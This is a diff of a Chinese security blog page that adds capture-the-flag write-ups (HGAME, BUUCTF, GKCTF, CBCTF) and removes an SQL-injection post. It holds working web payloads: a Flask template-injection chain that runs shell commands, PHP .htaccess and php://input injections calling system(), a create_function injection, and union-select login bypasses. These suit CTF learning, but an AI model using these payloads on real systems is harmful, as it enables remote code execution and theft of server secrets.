@@ -169,6 +169,196 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/01/2022-3-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hanbaiGG">
+      <meta itemprop="description" content="为什么不拉弟弟一把呢">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="灵能对抗实验室">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/01/2022-3-1/" class="post-title-link" itemprop="url">2022.3.1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-01 08:30:35" itemprop="dateCreated datePublished" datetime="2022-03-01T08:30:35+08:00">2022-03-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-02 18:00:14" itemprop="dateModified" datetime="2022-03-02T18:00:14+08:00">2022-03-02</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="HGAME"><a href="#HGAME" class="headerlink" title="HGAME"></a>HGAME</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="秋名山车神-http头"><a href="#秋名山车神-http头" class="headerlink" title="秋名山车神-http头"></a>秋名山车神-http头</h4><p>抓包查看请求头，发现一个自定义的值<code>gasoline</code>，推断这是一道http请求头修改的题目</p>
+<ul>
+<li>referer: qiumingshan.net</li>
+<li>user-agent:Hachi-Roku</li>
+<li>flavor:Raspberry</li>
+<li>gasoline:100</li>
+<li>X-Real-ip:127.0.0.1 <em>不同的代理服务器可以使用不同的请求头，<code> gin-gonic/gin</code>框架可以使用XFF和XRI</em></li>
+</ul>
+<h4 id="蜘蛛头"><a href="#蜘蛛头" class="headerlink" title="蜘蛛头"></a>蜘蛛头</h4><p>通往下一关的链接在一个数量递增的按钮块里，但查看元素后发现跳转网址只有一个，所以理论上可以直接f12一个个点过去，由于担心出题人整活就写了脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/71bb101faf&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span>():</span></span><br><span class="line">    count=<span class="number">1</span></span><br><span class="line">f1=foo()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethtml</span>(<span class="params">url1</span>):</span></span><br><span class="line">    key=<span class="string">&#x27;&#x27;</span> </span><br><span class="line">    f1.count+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(f1.count&gt;<span class="number">102</span>):</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    page=requests.get(url1)</span><br><span class="line">    <span class="built_in">print</span>(page.text)</span><br><span class="line">    key=re.findall(<span class="string">&#x27;\?key=.+3D&#x27;</span>,page.text)</span><br><span class="line">    <span class="comment">#key=key[10:20]</span></span><br><span class="line">    <span class="built_in">print</span>(url1)</span><br><span class="line">    url1=url+<span class="built_in">str</span>(key)[<span class="number">2</span>:-<span class="number">2</span>]</span><br><span class="line">    gethtml(url1)</span><br><span class="line">gethtml(url)</span><br></pre></td></tr></table></figure>
+<p>最后总共一百层，还好</p>
+<h4 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h4><p>又是喜闻乐见的小游戏时间<br>直接<code>ctrl</code>+<code>F</code>搜索score<br>结果查到一串jsfuck代码，放进浏览器控制台里跑一下就出结果了</p>
+<h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="麻烦的压缩包"><a href="#麻烦的压缩包" class="headerlink" title="麻烦的压缩包"></a>麻烦的压缩包</h4><ol>
+<li>加密的压缩包，查看属性存在注释</li>
+<li>暴力破解6位密码<code>483279</code></li>
+<li>获得密码本，使用字典攻击</li>
+<li>提示未压缩的压缩包，使用crc明文攻击</li>
+<li>binwalk3分析<code>flag.jpg</code>,得到最后一个压缩包</li>
+<li>伪加密修开判定hex值，打开获得flag</li>
+</ol>
+<h4 id="好康的流量"><a href="#好康的流量" class="headerlink" title="好康的流量"></a>好康的流量</h4><p>使用<code>wireshark</code>将流量文件导出为<code>smb</code>对象<br>放入<code>stegsolve</code>中得到条形码，扫描获得先半段flag<br><code>lsb</code>中选择RGB的0位获得后半段。</p>
+<h2 id="buuctf-rsa1"><a href="#buuctf-rsa1" class="headerlink" title="buuctf_rsa1"></a>buuctf_rsa1</h2><p>RSA中已知dq，dp的计算m步骤<code>（dp=dmod(p-1),dq=dmod(q-1)）</code>：</p>
+<ul>
+<li>计算q模p的逆元I;</li>
+<li>计算m1=(c^dp)modp;</li>
+<li>计算m2=(c^dq)modq;</li>
+<li>m=(((m1-m2)*I)modp)*q+m2;<br>解题脚本：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> </span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> </span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> </span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> </span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line">I = gmpy2.invert(q,p)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c,dp,p)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c,dq,q)</span><br><span class="line">m = (((m1-m2)*I)%p)*q+m2</span><br><span class="line"><span class="built_in">print</span>(m)                               </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))                      </span><br></pre></td></tr></table></figure>
+<h2 id="BUUCTF-ssti"><a href="#BUUCTF-ssti" class="headerlink" title="BUUCTF_ssti"></a>BUUCTF_ssti</h2><p>flask框架存在的服务端污染漏洞<br>测试ssti位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;9*9&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>得到<code>HELLO 81</code><br>证实存在ssti<br>寻找可用子类<br>先用<code>__class__</code>先找到’’的类<br>用<code>__bases__</code>找到他的基类<br><code>subclass()</code>找到子类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><em>一是file模块中的read功能，用来读取各种文件，敏感信息等。但是在<br>二是warnings.catch_warnings(需自己导入os模块)、socket._socketobject(需自己导入os模块)、site._Printer、site.Quitter等模块的内置os，通过os模块我们可以做到system执行命令（system执行成功返回0，不会在页面显示。）、popen管道读取文件、listdir列目录等操作。<br>三是get_flashed_messages() 获取闪现信息</em><br>寻找所需子类的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span>():</span></span><br><span class="line">    <span class="built_in">list</span> = <span class="string">&quot;&quot;</span> <span class="comment">#HTML</span></span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;class &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;enum &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27;type &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">list</span> = <span class="built_in">list</span>.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line">    className = <span class="string">&#x27;warnings.catch_warnings&#x27;</span> <span class="comment">#需要查找的模块名称</span></span><br><span class="line">    num = <span class="built_in">list</span>.index(className)</span><br><span class="line">    <span class="built_in">print</span>(num) <span class="comment">#返回索引</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    find()</span><br></pre></td></tr></table></figure>
+<p>得到：<code>166</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:25700/?name=&#123;&#123;%27%27.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27env%27).read()%22)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到环境变量中的flag值。</p>
+<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>对上传内容和文件名进行了过滤<br>使用<code>file_put_content</code>写入木马，通过<code>.hatccess</code>绕过。但成功一次后直接报错500<br>写入<code>#&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;&#39;);?&gt;</code><br>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;?php%20system(&#x27;cat%20/fla&#x27;.&#x27;g&#x27;);?&gt;\&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>
+<p>成功得到flag，打错一次后就一直500报错，试错成本有点高</p>
+<h2 id="GKCTF-2021-你知道apng吗"><a href="#GKCTF-2021-你知道apng吗" class="headerlink" title="[GKCTF 2021]你知道apng吗"></a>[GKCTF 2021]你知道apng吗</h2><p>apng是png的动图格式<br>通过apng-db_j51分解图片，得到4张带二维码的图片</p>
+<ul>
+<li>1号图片通过ps将其拉升回正常比例</li>
+<li>2号图片通过steg切换到黑白</li>
+<li>3，4正常扫描。</li>
+</ul>
+<p>获得完全体flag<br><em>apng作为小众的图片格式还能通过delay进行消息隐写</em></p>
+<h2 id="GKCTF-2021-excel-骚操作"><a href="#GKCTF-2021-excel-骚操作" class="headerlink" title="GKCTF 2021]excel 骚操作"></a>GKCTF 2021]excel 骚操作</h2><p><em>奇怪的知识点增加了</em><br>查看注释，啥也没有<br>走了一遍英协压缩的流程啥也没有<br>突然想到题目，可能是对单元格操作。<br>点到一看出现了个<code>1</code><br>将单元格格式改为常规，数字就出现了<br>感觉单元格组成了一个图案，将所有的1替换为黑色背景，出现了一个二维码的类似物<br>QR扫描失败，上网查询后得知是汉信码。找到专业工具后解码获得flag<br>汉信码百度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由中国物品编码中心完成的国家“十五”重大科技专项——《二维条码新码制开发与关键技术标准研究》取得了突破性成果，研究成果包括：研究开发汉信码新码制、开发汉信码生成软件、开发汉信码识读技术及算法、汉信码硬件设备研发、汉信码装备研制、汉信码通讯技术研发以及编制汉信码国家标准等的系列工作。</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/27/CBCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="hanbaiGG">
+      <meta itemprop="description" content="为什么不拉弟弟一把呢">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="灵能对抗实验室">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/27/CBCTF/" class="post-title-link" itemprop="url">CBCTF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-27 11:10:15 / 修改时间：15:39:32" itemprop="dateCreated datePublished" datetime="2021-12-27T11:10:15+08:00">2021-12-27</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="CBCTF！！"><a href="#CBCTF！！" class="headerlink" title="CBCTF！！"></a>CBCTF！！</h1><p>哪怕拿不到奖品，也要玩的开心</p>
+<h2 id="web1-sign-in"><a href="#web1-sign-in" class="headerlink" title="web1-sign_in"></a>web1-sign_in</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]&gt;<span class="number">2021</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]) || is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">exit</span>(<span class="string">&#x27;Please,dont give me array !&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]!=<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; md5(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])==md5(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">exit</span>(<span class="string">&quot;就差最后一点哦&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">exit</span>(<span class="string">&quot;please,get c and d !&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;a is too small&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;a can not be a number!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;please,get a !&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>数字和字符结合绕过a<br>c，dMD5<code>0e</code>绕过<br>e include文件包含漏洞<br>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://signin.0rays.club:41001/?a=2022a&amp;c=240610708&amp;d=s878926199a&amp;e=php://input</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="WEB-2"><a href="#WEB-2" class="headerlink" title="WEB 2"></a>WEB 2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$action = $_GET[&#x27;action&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">$arg = $_GET[&#x27;arg&#x27;] ?? &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;, $action)) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $action(&#x27;&#x27;, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>字符fuzz出baypass的特殊url字符：<code>%5c</code><br>通过拼接构造函数，写入一句话木马，antsword链接<br>PAYLOAD</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=\create_function&amp;arg=return&quot;2333&quot;;&#125;var_dump(scandir(&#x27;./&#x27;));/*</span><br></pre></td></tr></table></figure>
+<h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC 1"></a>MISC 1</h2><p>放入虚拟机，自动识别为压缩包<br>解压，<br>备注中发现压缩包密码提示，<br>字符掩码攻击<br>得到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0RAYSismyfavorit3t34m</span><br></pre></td></tr></table></figure>
+<p>得到图片<code>来上班.png（改成老色比会不会好点）</code><br>应该是lsb隐写，使用stegsolve查看<br>在red0通道隐写了flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">666c61677b613037 66326163352d3837  flag&#123;a07 f2ac5-87</span><br><span class="line">34392d343765612d 623436622d316261  49-47ea- b46b-1ba</span><br><span class="line">3938643635383935 637df1853bfffc00  98d65895 c&#125;..;...</span><br><span class="line">000db212e16a69a4 9fff80c0801b1488  .....ji. ........</span><br></pre></td></tr></table></figure>
+<h2 id="未完成题目"><a href="#未完成题目" class="headerlink" title="未完成题目"></a>未完成题目</h2><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>png高度问题<br>发现摩斯电码<br>解码后得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h o - o - o - o - o - o r s e ? m o - o - o - o r s e ! </span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/14/XSS-travel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1004,143 +1194,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/2021-11-1-3wp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hanbaiGG">
-      <meta itemprop="description" content="为什么不拉弟弟一把呢">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="灵能对抗实验室">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/01/2021-11-1-3wp/" class="post-title-link" itemprop="url">【GXYCTF2019】baby SQLi绕过MD5比较</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-11-01 15:18:44 / 修改时间：15:26:12" itemprop="dateCreated datePublished" datetime="2021-11-01T15:18:44+08:00">2021-11-01</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>随意登录<br>在search页面发现源码：select * from user where username = ‘$name<br>fuzz一下<br>过滤了（）=<br>登录admin返回wrong pass可知存在admin<br>用admin测试回显点 1’ union select 1,’admin’,3#<br>学习新知识点：<br>    union select在查找失败后会创造一个虚拟的数据，可以通过这一特性注入数据<br>user:1’ union select 1,’admin’,’123’#<br>passwd:123<br>没成功，因为密码是md5加密保存的<br>user：1’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#<br>passwd：123<br>成功登录</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/01/2021-11-1-1wp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="hanbaiGG">
